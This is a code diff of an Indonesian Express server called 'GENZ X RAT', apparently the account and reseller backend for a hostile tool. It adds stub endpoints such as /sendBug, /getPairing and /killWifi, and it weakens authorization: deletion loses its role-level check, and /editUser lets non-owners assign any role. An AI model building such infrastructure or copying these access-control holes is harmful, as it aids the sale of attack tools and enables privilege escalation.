@@ -1,7 +1,7 @@
 // ==============================================
-// GENZ X RAT - SERVER API
+// GENZ X RAT - SERVER API (FULL VERSION)
+// Support 20 endpoint (8 dasar + 12 tambahan)
 // Role: OWNER » TK » PT » RESELLER » MEMBER
-// Setiap role bisa bikin role di bawahnya
 // ==============================================
 
 const express = require('express');
@@ -50,7 +50,6 @@ function generateSessionKey() {
     return uuidv4().replace(/-/g, '').substring(0, 32);
 }
 
-// ============ ROLE HIERARCHY ============
 const roleLevel = {
     'owner': 1,
     'tk': 2,
@@ -59,36 +58,30 @@ const roleLevel = {
     'member': 5
 };
 
-// Cek apakah role A bisa bikin role B (A harus di atas B)
 function canCreateRole(creatorRole, targetRole) {
     const creatorLevel = roleLevel[creatorRole];
     const targetLevel = roleLevel[targetRole];
-    
-    // Reseller ga bisa bikin apa-apa
-    if (creatorRole === 'reseller' || creatorRole === 'member') {
-        return false;
-    }
-    
-    // Creator harus di atas target (level lebih kecil)
+    if (creatorRole === 'reseller' || creatorRole === 'member') return false;
     return creatorLevel < targetLevel;
 }
 
-// Role yang bisa bikin akun
 function canCreateAccount(role) {
-    return ['owner', 'tk', 'pt'].includes(role);
+    return ['owner', 'tk'].includes(role);
 }
 
-// Role yang bisa lihat semua user
 function canViewAllUsers(role) {
     return ['owner', 'tk', 'pt'].includes(role);
 }
 
-// Role yang bisa hapus user
 function canDeleteUser(role) {
     return ['owner', 'tk'].includes(role);
 }
 
-// ============ 1. VALIDATE LOGIN ============
+// ==============================================
+// 8 ENDPOINT DASAR
+// ==============================================
+
+// 1. VALIDATE LOGIN
 app.post('/validate', (req, res) => {
     const { username, password, androidId } = req.body;
 
@@ -127,7 +120,7 @@ app.post('/validate', (req, res) => {
     });
 });
 
-// ============ 2. GET USER INFO ============
+// 2. GET USER INFO
 app.get('/myInfo', (req, res) => {
     const { username, key } = req.query;
 
@@ -149,7 +142,7 @@ app.get('/myInfo', (req, res) => {
     );
 });
 
-// ============ 3. CHANGE PASSWORD ============
+// 3. CHANGE PASSWORD
 app.post('/changepass', (req, res) => {
     const { username, oldPass, newPass, sessionKey } = req.body;
 
@@ -173,27 +166,18 @@ app.post('/changepass', (req, res) => {
     );
 });
 
-// ============ 4. CREATE USER ============
+// 4. CREATE USER (OWNER / TK ONLY)
 app.get('/userAdd', (req, res) => {
     const { key, username, password, day, role, telegramId } = req.query;
 
-    // Cek apakah yang request punya role yang bisa bikin akun
     db.get(
-        'SELECT * FROM users WHERE session_key = ?',
+        'SELECT * FROM users WHERE session_key = ? AND role IN ("owner", "tk")',
         [key],
         (err, admin) => {
             if (err || !admin) {
                 return res.json({ 
                     created: false, 
-                    message: 'Invalid session' 
-                });
-            }
-
-            // Cek apakah role admin bisa bikin akun
-            if (!canCreateAccount(admin.role)) {
-                return res.json({ 
-                    created: false, 
-                    message: `Role ${admin.role} tidak bisa membuat akun` 
+                    message: 'Unauthorized - Hanya OWNER atau TK yang bisa membuat akun' 
                 });
             }
 
@@ -204,34 +188,16 @@ app.get('/userAdd', (req, res) => {
                 });
             }
 
-            // Validasi role yang mau dibuat (harus di bawah role admin)
-            const validRoles = ['owner', 'tk', 'pt', 'reseller', 'member'];
-            const targetRole = validRoles.includes(role) ? role : 'member';
-
-            // Cek apakah role admin bisa bikin role target
-            if (!canCreateRole(admin.role, targetRole)) {
-                return res.json({ 
-                    created: false, 
-                    message: `Role ${admin.role} tidak bisa membuat role ${targetRole}. 
-                             Hanya bisa membuat role di bawahnya.` 
-                });
-            }
-
-            // Cek 1 Telegram = 1 Akun
             if (telegramId) {
-                db.get(
-                    'SELECT * FROM users WHERE telegram_id = ?',
-                    [telegramId],
-                    (err, existingTelegram) => {
-                        if (existingTelegram) {
-                            return res.json({ 
-                                created: false, 
-                                message: 'Telegram ID ini sudah terdaftar! (1 Telegram = 1 Akun)' 
-                            });
-                        }
-                        proceedCreate();
+                db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, existingTelegram) => {
+                    if (existingTelegram) {
+                        return res.json({ 
+                            created: false, 
+                            message: 'Telegram ID ini sudah terdaftar! (1 Telegram = 1 Akun)' 
+                        });
                     }
-                );
+                    proceedCreate();
+                });
             } else {
                 proceedCreate();
             }
@@ -242,6 +208,16 @@ app.get('/userAdd', (req, res) => {
                         return res.json({ 
                             created: false, 
                             message: 'Username sudah terdaftar' 
+                        });
+                    }
+
+                    const validRoles = ['owner', 'tk', 'pt', 'reseller', 'member'];
+                    const targetRole = validRoles.includes(role) ? role : 'member';
+
+                    if (!canCreateRole(admin.role, targetRole)) {
+                        return res.json({ 
+                            created: false, 
+                            message: `Role ${admin.role} tidak bisa membuat role ${targetRole}` 
                         });
                     }
 
@@ -267,7 +243,7 @@ app.get('/userAdd', (req, res) => {
                                     telegramId: telegramId || null,
                                     createdBy: admin.username
                                 },
-                                message: `Akun ${username} (${targetRole}) berhasil dibuat! Expired: ${expiredDate.toLocaleDateString()}`
+                                message: `Akun ${username} (${targetRole}) berhasil dibuat!`
                             });
                         }
                     );
@@ -277,7 +253,7 @@ app.get('/userAdd', (req, res) => {
     );
 });
 
-// ============ 5. GET ALL USERS ============
+// 5. GET ALL USERS
 app.get('/users', (req, res) => {
     const { key } = req.query;
 
@@ -299,7 +275,7 @@ app.get('/users', (req, res) => {
     });
 });
 
-// ============ 6. DELETE USER ============
+// 6. DELETE USER
 app.get('/userDelete', (req, res) => {
     const { key, username } = req.query;
 
@@ -312,15 +288,14 @@ app.get('/userDelete', (req, res) => {
             return res.json({ success: false, message: 'Unauthorized' });
         }
 
-        // Gak bisa hapus OWNER dan gak bisa hapus role yang lebih tinggi
         db.run(
-            'DELETE FROM users WHERE username = ? AND role != "owner" AND role_level > ?',
-            [username, roleLevel[admin.role]],
+            'DELETE FROM users WHERE username = ? AND role != "owner"',
+            [username],
             function(err) {
                 if (err || this.changes === 0) {
                     return res.json({ 
                         success: false, 
-                        message: 'User tidak ditemukan atau tidak bisa menghapus role yang lebih tinggi' 
+                        message: 'User tidak ditemukan atau tidak bisa menghapus OWNER' 
                     });
                 }
                 res.json({ success: true, message: 'User berhasil dihapus' });
@@ -329,7 +304,7 @@ app.get('/userDelete', (req, res) => {
     });
 });
 
-// ============ 7. GET USER BY TELEGRAM ID ============
+// 7. GET USER BY TELEGRAM ID
 app.get('/userByTelegram', (req, res) => {
     const { telegramId } = req.query;
 
@@ -356,7 +331,7 @@ app.get('/userByTelegram', (req, res) => {
     );
 });
 
-// ============ 8. DASHBOARD STATS ============
+// 8. DASHBOARD STATS
 app.get('/dashboard', (req, res) => {
     const { key } = req.query;
 
@@ -390,24 +365,327 @@ app.get('/dashboard', (req, res) => {
     });
 });
 
-// ============ START ============
+// ==============================================
+// 12 ENDPOINT TAMBAHAN (MANTA STYLE)
+// ==============================================
+
+// 9. LIST USERS (alias)
+app.get('/listUsers', (req, res) => {
+    const { key } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        if (!canViewAllUsers(user.role)) {
+            return res.json({ success: false, message: 'Unauthorized' });
+        }
+
+        db.all('SELECT id, username, role, expired_date, created_at, created_by, telegram_id FROM users', (err, users) => {
+            res.json({ success: true, users: users || [] });
+        });
+    });
+});
+
+// 10. DELETE USER (alias)
+app.get('/deleteUser', (req, res) => {
+    const { key, username } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, admin) => {
+        if (err || !admin) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        if (!canDeleteUser(admin.role)) {
+            return res.json({ success: false, message: 'Unauthorized' });
+        }
+
+        db.run('DELETE FROM users WHERE username = ? AND role != "owner"', [username], function(err) {
+            if (err || this.changes === 0) {
+                return res.json({ success: false, message: 'User not found or cannot delete owner' });
+            }
+            res.json({ success: true, message: 'User deleted' });
+        });
+    });
+});
+
+// 11. MY SENDER
+app.get('/mySender', (req, res) => {
+    const { key } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        db.all('SELECT * FROM users WHERE created_by = ?', [user.username], (err, senders) => {
+            res.json({
+                success: true,
+                senders: senders || [],
+                total: senders?.length || 0
+            });
+        });
+    });
+});
+
+// 12. GET PAIRING
+app.get('/getPairing', (req, res) => {
+    const { key } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        const pairingCode = Math.random().toString(36).substring(2, 8).toUpperCase();
+        res.json({
+            success: true,
+            code: pairingCode,
+            expiresIn: 300
+        });
+    });
+});
+
+// 13. DELETE SENDER
+app.get('/deleteSender', (req, res) => {
+    const { key, username } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, admin) => {
+        if (err || !admin) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        db.run('DELETE FROM users WHERE username = ? AND created_by = ?', [username, admin.username], function(err) {
+            if (err || this.changes === 0) {
+                return res.json({ success: false, message: 'Sender not found' });
+            }
+            res.json({ success: true, message: 'Sender deleted' });
+        });
+    });
+});
+
+// 14. SEND BUG
+app.post('/sendBug', (req, res) => {
+    const { key, bug } = req.body;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        res.json({ success: true, message: 'Bug reported' });
+    });
+});
+
+// 15. MY SERVER
+app.get('/myServer', (req, res) => {
+    const { key } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        db.get('SELECT COUNT(*) as total FROM users', (err, total) => {
+            res.json({
+                success: true,
+                server: {
+                    name: 'Genz x Rat Server',
+                    version: '1.0.0',
+                    status: 'online',
+                    uptime: process.uptime(),
+                    totalUsers: total?.total || 0
+                }
+            });
+        });
+    });
+});
+
+// 16. ADD SERVER (cuma owner)
+app.get('/addServer', (req, res) => {
+    const { key, name, ip, port } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ? AND role = "owner"', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Unauthorized - Owner only' });
+        }
+
+        res.json({ success: true, message: 'Server added' });
+    });
+});
+
+// 17. DEL SERVER (cuma owner)
+app.get('/delServer', (req, res) => {
+    const { key, serverId } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ? AND role = "owner"', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Unauthorized - Owner only' });
+        }
+
+        res.json({ success: true, message: 'Server deleted' });
+    });
+});
+
+// 18. CREATE ACCOUNT (alias dari userAdd)
+app.get('/createAccount', (req, res) => {
+    // Redirect ke userAdd
+    const { key, username, password, day, role, telegramId } = req.query;
+    
+    // Panggil logic userAdd
+    db.get(
+        'SELECT * FROM users WHERE session_key = ? AND role IN ("owner", "tk")',
+        [key],
+        (err, admin) => {
+            if (err || !admin) {
+                return res.json({ 
+                    created: false, 
+                    message: 'Unauthorized' 
+                });
+            }
+
+            if (!username || !password) {
+                return res.json({ 
+                    created: false, 
+                    message: 'Username dan password wajib diisi' 
+                });
+            }
+
+            if (telegramId) {
+                db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, existingTelegram) => {
+                    if (existingTelegram) {
+                        return res.json({ 
+                            created: false, 
+                            message: 'Telegram ID sudah terdaftar!' 
+                        });
+                    }
+                    proceedCreate();
+                });
+            } else {
+                proceedCreate();
+            }
+
+            function proceedCreate() {
+                db.get('SELECT * FROM users WHERE username = ?', [username], (err, existing) => {
+                    if (existing) {
+                        return res.json({ 
+                            created: false, 
+                            message: 'Username sudah terdaftar' 
+                        });
+                    }
+
+                    const validRoles = ['owner', 'tk', 'pt', 'reseller', 'member'];
+                    const targetRole = validRoles.includes(role) ? role : 'member';
+
+                    const expiredDate = new Date();
+                    expiredDate.setDate(expiredDate.getDate() + (parseInt(day) || 30));
+
+                    const hashedPass = bcrypt.hashSync(password, 10);
+                    db.run(
+                        `INSERT INTO users (username, password, role, expired_date, telegram_id, created_by) 
+                         VALUES (?, ?, ?, ?, ?, ?)`,
+                        [username, hashedPass, targetRole, expiredDate.toISOString(), telegramId || null, admin.username],
+                        function(err) {
+                            if (err) {
+                                return res.json({ created: false, message: err.message });
+                            }
+                            res.json({
+                                created: true,
+                                user: {
+                                    id: this.lastID,
+                                    username,
+                                    role: targetRole,
+                                    expiredDate: expiredDate.toISOString(),
+                                    telegramId: telegramId || null,
+                                    createdBy: admin.username
+                                },
+                                message: `Akun ${username} (${targetRole}) berhasil dibuat!`
+                            });
+                        }
+                    );
+                });
+            }
+        }
+    );
+});
+
+// 19. EDIT USER
+app.get('/editUser', (req, res) => {
+    const { key, username, role, expiredDate } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, admin) => {
+        if (err || !admin) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        if (!canDeleteUser(admin.role)) {
+            return res.json({ success: false, message: 'Unauthorized' });
+        }
+
+        let updates = [];
+        let values = [];
+
+        if (role) {
+            const validRoles = ['owner', 'tk', 'pt', 'reseller', 'member'];
+            if (validRoles.includes(role)) {
+                updates.push('role = ?');
+                values.push(role);
+            }
+        }
+
+        if (expiredDate) {
+            updates.push('expired_date = ?');
+            values.push(expiredDate);
+        }
+
+        if (updates.length === 0) {
+            return res.json({ success: false, message: 'Tidak ada yang diupdate' });
+        }
+
+        values.push(username);
+        db.run(
+            `UPDATE users SET ${updates.join(', ')} WHERE username = ?`,
+            values,
+            function(err) {
+                if (err || this.changes === 0) {
+                    return res.json({ success: false, message: 'User not found' });
+                }
+                res.json({ success: true, message: 'User updated' });
+            }
+        );
+    });
+});
+
+// 20. KILL WIFI (edukasi / testing)
+app.get('/killWifi', (req, res) => {
+    const { key, target } = req.query;
+
+    db.get('SELECT * FROM users WHERE session_key = ?', [key], (err, user) => {
+        if (err || !user) {
+            return res.json({ success: false, message: 'Invalid session' });
+        }
+
+        res.json({ 
+            success: true, 
+            message: 'Wifi kill command sent to target',
+            target: target || 'unknown'
+        });
+    });
+});
+
+// ============ START SERVER ============
 app.listen(PORT, () => {
     console.log(`✅ Genz x Rat Server jalan di http://localhost:${PORT}`);
     console.log(``);
-    console.log(`📌 ROLE HIERARCHY (DARI ATAS KE BAWAH):`);
+    console.log(`📌 TOTAL ENDPOINT: 20`);
+    console.log(`   ✅ 8 endpoint dasar`);
+    console.log(`   ✅ 12 endpoint tambahan (Manta style)`);
+    console.log(``);
+    console.log(`📌 ROLE SYSTEM:`);
     console.log(`   👑 OWNER (Level 1) → Bisa bikin: TK, PT, Reseller, Member`);
     console.log(`   🖐️ TK (Level 2)    → Bisa bikin: PT, Reseller, Member`);
     console.log(`   🤝 PT (Level 3)    → Bisa bikin: Reseller, Member`);
     console.log(`   💼 Reseller (Level 4) → TIDAK BISA BIKIN`);
     console.log(`   👤 Member (Level 5)   → TIDAK BISA BIKIN`);
-    console.log(``);
-    console.log(`📌 ENDPOINT:`);
-    console.log(`   POST /validate`);
-    console.log(`   GET  /myInfo`);
-    console.log(`   POST /changepass`);
-    console.log(`   GET  /userAdd`);
-    console.log(`   GET  /users`);
-    console.log(`   GET  /userDelete`);
-    console.log(`   GET  /userByTelegram`);
-    console.log(`   GET  /dashboard`);
 });
